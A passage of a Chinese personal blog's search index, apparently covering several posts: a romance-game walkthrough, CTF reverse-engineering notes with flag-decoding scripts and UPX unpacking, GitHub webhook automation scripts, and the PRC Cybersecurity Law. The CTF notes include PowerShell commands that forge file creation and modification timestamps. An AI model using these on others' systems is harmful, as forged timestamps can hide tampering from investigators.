美剧情\n对白真的很暖！\n六、甜蜜过后的烦躁期\n生活上的烦心事和小事，最容易在细节处伤到别人\n\n“￥%……*&amp;……o”\n\n此时的音乐也开始变得急促\n第一次玩这里只有一个选项，所以我直接选了，然后过一会又出现一个选项，我接着点了。吵架的气泡也随着越来越大\n到结局提示才知道这边也有错误\n吵架时的你是那么得理不饶人。而我也不愿意先让步，常常把一些鸡毛蒜皮的小事弄得发不可收拾\n第二次玩有了第一次的经验和以往点屏幕的经验，我开始点屏幕上的东西，但是丝毫没有反应\n第三次玩有了前两次的教训，我已经逐渐理解，应该做出让步，但是只有一个选项，要怎么选？\n经过查了才知道，这边要等一会才会触发完美结局\n\n\n生活上的烦心事和小事，最容易在细节处伤到别人，在吵架的时候双方每个人都需要作出让步，相互理解相互宽容\n\n七、同居时的陪伴\n和刚认识她的时候一样，她还是很喜欢和我抱怨生活中遇到的烦心事.\n她明明很聪明，我想这些琐事应该难不倒她\n却不知为何好像总是因为这些琐事而烦心\n\n\n第一次玩这对话框怎么跟之前一样啊歪，我刚看到就觉得有蹊跷，但是无奈，只得点击选项\n当然，不是完美结局\n第二次玩由于明白了屏幕可以点，我试着点了点男主，发现男主可以滑动，顺着滑动过去，让男主过去陪女主，做一个好的倾听者\n这边的对白也很暖！！！\n\n其实我知道，她很清楚这些问题该怎么处理\n我只需要当一个聆听者，陪在她的身边，那就足够了.\n\n\n一个好男友一定是一个好的倾听者！！！\n情侣间有时候需要处理的不是事情，而是态度\n\n八、同居时的烦恼\n当距离越来越近，原本从远处看不清的瑕疵，也会越发明显\n只要两个人生活在一起，就会有问题发生\n这时候，要么是她迁就我，要么是我迁就她，难道不是吗?\n加班到深夜回来时，她正看着她最爱的韩剧。\n四周散落着零食的包装和纸巾。\n\n\n第一次玩这里有两个选项“让女主收拾”和“我来收拾”，我首先想到的是我就惯着他吧，我来收拾，后来通过结局才发现我错了\n无论是谁迁就谁，只要是单方面的迁就，就不会有相互谅解的关系长久\n但矛盾的是，有时候，我又会想你能够包容一下我的缺点。\n第二次玩由于第一次错了于是我又点了另一个，让她来收拾，但还是错了\n第三次玩想到屏幕可以滑动，我点了一下垃圾，才走到正确剧情\n我以为剧情一直是从男主的视角来考虑爱情，没想到这个镜头的主角是女主，作者太有心了\n\n\n原来爱情中是双方的付出，而不是一个人单方面的付出，另一个人只知享受\n\n\n比起单方面的迁就，两个人的相处更应该是相互的。\n相互依靠的两人总比单依赖一方的两人站得稳，不是吗?\n时间飞快流逝，距离你我相识，已经过去三年\n\n九、结局不完美结局\n我突然的来信没有吓到你吧?\n这或许是我第一次这么毫无保留地向你透露心声\n也是应该是最后一次了。\n很可惜我们最后还是没能一起走下去。\n但是我不后悔，因为我从我们的相处中学到了很多\n祝君安好。再见。\n\n完美结局\n还记得我们是在gamejam上认识的\n当时你主动和我说话。\n聊到游戏我们的意见是一拍即合。围绕那次gamejam主题，我们开始越聊越投契\n在那之后，我们又开始聊微信。\n不知不觉中，你就成为了我的第一倾诉对象\n还记得我们的第一次约会吗?\n你和我去看我最喜欢的”猫耳摩斯”电影。然后又带我去吃我最喜欢的麻辣火锅。大概你有仔细看过我朋友圈吧?\n知道你事前有好好为约会准备，我当时还是挺感动的\n还记得我们的第一次牵手吗?\n那天晚上月色很美。我到现在还记得你静静牵起我手时的感觉。我们就这样开始了。\n在一起以后，我们有了更多的时间去了解彼此\n我们谈论共同的兴趣爱好，生活中大小事情\n和你在一起的日子大多都是甜蜜的，然而我们有时也会吵架\n但庆幸我们能够相互谅解。一点点的争吵反而成为我们加深了解的机会\n有时我会想你听我抱怨生活中的那那些烦心事\n而你总能够在我需要的时候，做一个安静的聆听者\n陪在我身边，静静听我讲那些生活中的琐碎事情。\n我知道我们都并不完美。\n好在我们知道怎样平衡彼此的关系，而不是一味依赖某一方\n这或许是我第一次这么毫无保留地向你透露心声\n我只是希望你能够理解我的心情，多点关心我\n希望在我们的下一个三年里，我们能够更好地相处吧。相识周年纪念日快乐!\n\n","categories":["游戏心得"],"tags":["内心深处的呐喊-《拣爱》"]},{"title":"一些零碎的知识点","url":"/posts/93fef3f.html","content":"关于二维码二维码除了定位点不能被遮挡外，其他地方不是有数据冗余机制嘛，允许10%-20%以内的遮挡&#x2F;噪声好像是\n不同软件算法可能不一样，有的能算出来原始数据，有的算不出来\n这也是那个stable diffusion生成二维码能契合原图的原因\n在生成二维码的时候，由于有这部分冗余的存在，在一定程度上“丢掉”某些颜色差异与底图过大的信息是不影响数据表达的。但会影响传输可靠性\n比如这个码你很难在 摄像设备歪斜&#x2F;远距离&#x2F;模糊的展板 的情况下成功扫出来\n——来自芃哥\n修改文件创建时间等使用windows自带的powershell即可，win+r键，输入powershell,在弹出的命令窗口输入命令，以abc.txt举例\n1.修改文件创建时间\n$(Get-Item abc.txt).creationtime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)\n\n2.修改文件最后访问时间\n$(Get-Item abc.txt).lastaccesstime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)\n\n3.修改文件最后修改时间\n$(Get-Item abc.txt).lastwritetime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)\n\n关于Python—base64编码crypt &#x3D; base64.b64encode(enc.encode(‘utf-8’)).decode(‘utf-8’)\ncipher &#x3D; base64.b64decode(crypt).decode(‘utf-8’)\n关于这两段为什么要写两个utf-8\n​                                 \n关于Python解密Str = &quot;ylqq]aycqyp&#123;&quot;flag = []for i in range(0, len(Str)):  if (Str[i] &lt;= chr(94) or Str[i] &gt; chr(96)) and (Str[i] &lt;= chr(62) or Str[i] &gt; chr(64)):     flag.append(chr(ord(Str[i])+2))  else:     flag.append(chr(ord(Str[i])-24))print(&#x27;&#x27;.join(flag))# 知识点# flag要写为列表，字符串不可以直接相加减# 做加减法的时候要先ord转化在加减然后转化为chr字符串# 然后在字符操作# 最后用join()拼接\n\n关于Python找数组相同元素下标可以直接用函数find，例如\nflag = &#x27;&#x27;s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;len1=int(len(result)/2)for i in range(len1):  s1 = s.find(result[i * 2]) - i  s2 = 34 - s.find(result[i * 2 + 1]) - i - 1  if s2 &lt; 0:     s2 = s2 + 34  else:     flag += chr(s1 * 17 + s2)print(flag)\n\n其中s.find(result[i2])就是找s中和result[2i]元素相同元素的下标\n关于upx加壳脱壳指令upx.exe –o 别名.exe –d 现名.exe\n-o：表示输出；\n-o 别名.exe：表示以别名.exe作为脱壳后的输出；\n-d 现名.exe：表示以现名.exe作为脱壳前的输入。\n关于Python切片Python切片操作_小魔王降临的博客-CSDN博客\n关于IDA交叉引用就是看哪段代码引用了这个变量\n关于C语言伪代码转化关于Python的random库import randomprint(random.getrandbits(8))    #返回一个八位大小的整数扩展：8位大小的整数是指二进制八位00000000-11111111的数，转换成十进制就是0-255random.seed(1)             #设置一个种子为1并生成随机数，设置种子后生成的随机数就是固定的（逆向题可用）\n\n\n\n关于xor异或的逆运算A&#x3D;A^B^B\n关于Python语法小记字符串连接时只能将字符和字符连接，flag+&#x3D;str（）\nOrd是转化成对应的ascll\n异或运算只能int类型，ord()^int()\n定义字符串单双引号都可以\n关于大端序和小端序的区别BUUCTF SimpleRev（涉及大小端序存储的问题）_Afanbird的博客-CSDN博客\n大端序和小端序_Casuall的博客-CSDN博客\n1、大端模式：高字节保存在内存的低地址\n2、小端模式：高字节保存在内存的高地址\nBig-endian：高位字节存入低地址，低位字节存入高地址\nLittle-endian：低位字节存入低地址，高位字节存入高地址\n一般来说，x86系列CPU都是Little-endian字节序，PowerPC通常是Big-endian字节序。\n关于可以直接打进地址栏的文件类型data:image&#x2F;png;base64,iVB………………………………\n关于base编码原理Base系列编码浅析【base16 base32 base64 base85 base36 base 58 base91 base 92 base62】 - 0yst3r - 博客园 (cnblogs.com)\n关于CTF常见编码以及加解密CTF常见编码及加解密（超全） - ruoli-s - 博客园 (cnblogs.com)\n常用的在线编码工具CyberChef (gchq.github.io)\nCiphey&#x2F;Ciphey: ⚡ Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes ⚡ (github.com)\nCTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)\n在线工具 - Bugku CTF\n关于ASCII逆向穷举例如：[ACTF新生赛2020]rome1\na= &#x27;ACTF&#123;&#x27;enc=&#x27;Qsw3sj_lz4_Ujw@l&#x27;s=&#x27;&#x27;for i in range(len(enc)):  for n in range(128):     j=n     if j &gt;64 and j&lt;=90:       j=(j-51)%26+65     if j&gt;96 and j&lt;=122:       j= (j-79)%26 +97     if j==ord(enc[i]):       a=a+chr(n)print(a+&#x27;&#125;&#x27;)\n\nACTF{Cae3ar_th4_Gre@t}\n题目中意思是输入的字符经过一系列加密得到enc，在逆向的过程中可以用穷举的方法逐渐得到结果，以顺代逆\n","categories":["学习笔记","计算机"],"tags":["计算机"]},{"title":"一些好玩的网站","url":"/posts/cc76d308.html","content":"1.致美化windows美化\n致美化是一个老牌桌面美化分享站，创办于 2014 年。探索丰富多彩的主题、壁纸、图标、皮肤等酷炫的美化素材，更有全面的美化教程及工具，是一个比较良心的美化站。\n2.在线文件转换器使用这款免费快速在线转换器. 将pdf, 图像, 视频, 文档, 音频, 电子书及压缩等文件格式转换为其他格式。现支持超过20200多种不同格式转换。\n3.从0开始做博客不用介绍什么了，这是知乎大佬收集的一篇文章，我的博客就是根据这个搭建的\n","categories":["网站收录"],"tags":["网站收录"]},{"title":"一键为你的所有Github仓库增加/删除指定Webhook","url":"/posts/697195e9.html","content":"GitHub 提供了 Webhooks 功能，允许开发者在仓库发生特定事件时接收 HTTP 请求通知。如果你有大量的 GitHub 仓库，并希望为它们统一添加 Webhook，手动操作将是一项繁琐的任务。本文介绍了如何利用 Python 脚本实现一键为所有 GitHub 仓库添加 Webhook，以及如何一键删除这些 Webhook。\n1. 准备工作在开始之前，你需要确保以下准备工作已完成：\n\n获取 GitHub Access Token：你需要拥有一个具有足够权限的 GitHub 帐户，并生成一个 Access Token，用于通过 API 访问你的仓库。注意保管好你的 Access Token，不要泄露给他人。\n准备 Webhook 地址：你需要准备一个用于接收 Webhook 通知的 URL 地址，可以是你自己搭建的服务器或者第三方服务。\n\n2. 添加 Webhook 的 Python 脚本下面是一个 Python 脚本，可以一键为你的所有 GitHub 仓库添加 Webhook：\nimport requestsimport jsondef create_webhook(repo_name, webhook_url, access_token):    # 构建请求头    headers = &#123;        &quot;Authorization&quot;: f&quot;token &#123;access_token&#125;&quot;,        &quot;Accept&quot;: &quot;application/vnd.github.v3+json&quot;,    &#125;    # 构建 Webhook 数据    data = &#123;        &quot;name&quot;: &quot;web&quot;,        &quot;active&quot;: True,        &quot;events&quot;: [&quot;*&quot;],        &quot;config&quot;: &#123;&quot;url&quot;: webhook_url, &quot;content_type&quot;: &quot;json&quot;&#125;,    &#125;    # 发送 POST 请求创建 Webhook    response = requests.post(        f&quot;https://api.github.com/repos/&#123;repo_name&#125;/hooks&quot;,        headers=headers,        data=json.dumps(data),    )    # 处理响应    if response.status_code == 201:        print(f&quot;成功为 &#123;repo_name&#125; 创建 Webhook&quot;)    else:        print(f&quot;无法为 &#123;repo_name&#125; 创建 Webhook。状态码: &#123;response.status_code&#125;&quot;)        print(response.text)def main():    # 填写你的 Access Token 和 Webhook 地址    access_token = &quot;你的access_token&quot;    webhook_url = &quot;你的Webhook地址&quot;    # 初始化分页参数    page = 1    per_page = 30  # 每页多少个仓库，根据实际情况调整    while True:        # 获取当前页的仓库信息        response = requests.get(            &quot;https://api.github.com/user/repos&quot;,            headers=&#123;&quot;Authorization&quot;: f&quot;token &#123;access_token&#125;&quot;&#125;,            params=&#123;&quot;per_page&quot;: per_page, &quot;page&quot;: page&#125;,        )        if response.status_code == 200:            repos = response.json()            if not repos:  # 如果当前页没有仓库信息，说明已经获取完所有仓库                break            for repo in repos:                repo_name = repo[&quot;full_name&quot;]                create_webhook(repo_name, webhook_url, access_token)            page += 1        else:            print(f&quot;无法获取仓库列表。状态码: &#123;response.status_code&#125;&quot;)            print(response.text)            breakif __name__ == &quot;__main__&quot;:    main()\n\n3. 删除 Webhook 的 Python 脚本如果需要删除已添加的 Webhook，可以使用以下 Python 脚本：\nimport requestsimport jsonimport time  # 导入时间模块def delete_webhook(repo_name, webhook_url, access_token):    headers = &#123;        &quot;Authorization&quot;: f&quot;token &#123;access_token&#125;&quot;,        &quot;Accept&quot;: &quot;application/vnd.github.v3+json&quot;,    &#125;    # 获取指定仓库的 Webhooks    response = requests.get(        f&quot;https://api.github.com/repos/&#123;repo_name&#125;/hooks&quot;,        headers=headers,    )    if response.status_code == 200:        webhooks = response.json()        for webhook in webhooks:            if webhook[&quot;config&quot;][&quot;url&quot;] == webhook_url:                # 删除指定 Webhook                response_delete = requests.delete(                    f&quot;https://api.github.com/repos/&#123;repo_name&#125;/hooks/&#123;webhook[&#x27;id&#x27;]&#125;&quot;,                    headers=headers,                )                if response_delete.status_code == 204:                    print(f&quot;成功删除 &#123;repo_name&#125; 的指定 Webhook&quot;)                else:                    print(                        f&quot;无法删除 &#123;repo_name&#125; 的指定 Webhook。状态码: &#123;response_delete.status_code&#125;&quot;                    )                    print(response_delete.text)                break        else:            print(f&quot;&#123;repo_name&#125; 中未找到指定的 Webhook&quot;)    else:        print(f&quot;无法获取 &#123;repo_name&#125; 的 Webhooks。状态码: &#123;response.status_code&#125;&quot;)        print(response.text)    # 添加延迟，以减慢请求频率    time.sleep(2)  # 等待2秒钟，防止请求过于频繁def delete_all_webhooks(webhook_url, access_token):    page = 1    per_page = 30  # 根据实际情况调整每页的数量    while True:        # 获取当前页的仓库信息        response = requests.get(            &quot;https://api.github.com/user/repos&quot;,            headers=&#123;&quot;Authorization&quot;: f&quot;token &#123;access_token&#125;&quot;&#125;,            params=&#123;&quot;per_page&quot;: per_page, &quot;page&quot;: page&#125;,        )        if response.status_code == 200:            repos = response.json()            if not repos:  # 如果当前页没有仓库信息，说明已经获取完所有仓库                break            for repo in repos:                repo_name = repo[&quot;full_name&quot;]                delete_webhook(repo_name, webhook_url, access_token)            page += 1        else:            print(f&quot;无法获取仓库列表。状态码: &#123;response.status_code&#125;&quot;)            print(response.text)            breakif __name__ == &quot;__main__&quot;:    # 填写你的 Access Token 和 Webhook 地址    access_token = &quot;你的access_token&quot;    webhook_url = &quot;你的Webhook地址&quot;    delete_all_webhooks(webhook_url, access_token)\n\n注意事项和使用须知\nAccess Token 安全性：请妥善保管你的 Access Token，不要泄露给他人，因为它具有对你的 GitHub 仓库进行操作的权限。\n网络请求频率：GitHub 的 API 有请求频率限制，过\n\n于频繁的请求可能会被拒绝。为了避免这种情况，建议在脚本中添加适当的延迟，以减缓请求频率。\n\n脚本参数修改：在使用脚本之前，你需要根据自己的情况修改脚本中的 Access Token 和 Webhook 地址参数。\n异常处理：脚本中包含了部分异常处理，但仍有可能因为网络或其他原因导致请求失败，建议在实际使用中注意查看日志，及时处理异常情况。\n\n免责声明本文所提供的脚本仅供参考和学习之用，使用者应对其在实际生产环境中可能产生的任何后果负全部责任。在使用之前，请务必仔细阅读并理解 GitHub 的 API 使用条款和隐私政策。\n","categories":["技术教程","Github"],"tags":["Github","Python脚本","自动化","Webhook","开发工具"]},{"title":"中华人民共和国网络安全法","url":"/posts/b81fa239.html","content":"中华人民共和国网络安全法​\t\t（2016年11月7日第十二届全国人民代表大会常务委员会第二十四次会议通过）\n来源： 中国人大网 2016年11月7日 17:31:34\n目  录\n  [第一章  总  则](#第一章  总  则)\n  [第二章  网络安全支持与促进](#第二章  网络安全支持与促进)\n  第三章  网络运行安全\n​          第一节 一般规定\n​          第二节 关键信息基础设施的运行安全\n  第四章  网络信息安全\n  第五章 监测预警与应急处置\n  [第六章 法律责任](#第六章 法律责任)\n  [第七章 附  则](#第七章 附  则)\n第一章  总  则第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。\n第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。\n第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。\n第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。\n第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。\n第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。\n第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。\n第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。\n县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。\n第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。\n第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。\n第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。\n第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。\n任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。\n第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。\n第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。\n有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。\n第二章  网络安全支持与促进第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。\n国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。\n第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。\n第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。\n第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。\n国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。\n第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。\n大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。\n第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。\n第三章 网络运行安全第一节 一般规定第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：\n（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；\n（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；\n（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；\n（四）采取数据分类、重要数据备份和加密等措施；\n（五）法律、行政法规规定的其他义务。\n第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。\n网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。\n网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。\n第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。\n第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。\n国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。\n第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。\n第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。\n第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。\n第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。\n第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。\n有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。\n第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。\n第二节 关键信息基础设施的运行安全第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。\n国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。\n第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。\n第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。\n第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：\n（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；\n（二）定期对从业人员进行网络安全教育、技术培训和技能考核；\n（三）对重要系统和数据库进行容灾备份；\n（四）制定网络安全事件应急预案，并定期进行演练；\n（五）法律、行政法规规定的其他义务。\n第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。\n第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。\n第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。\n第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。\n第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：\n（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；\n（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；\n（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；\n（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。\n第四章 网络信息安全第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。\n第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。\n网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。\n第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。\n网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。\n第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。\n第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。\n第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。\n第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。\n第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。\n第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。\n电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。\n第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。\n网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。\n第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。\n第五章 监测预警与应急处置第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。\n第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。\n第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。\n负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。\n网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。\n第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：\n（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；\n（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；\n（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。\n第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。\n第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。\n第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。\n第五十八条 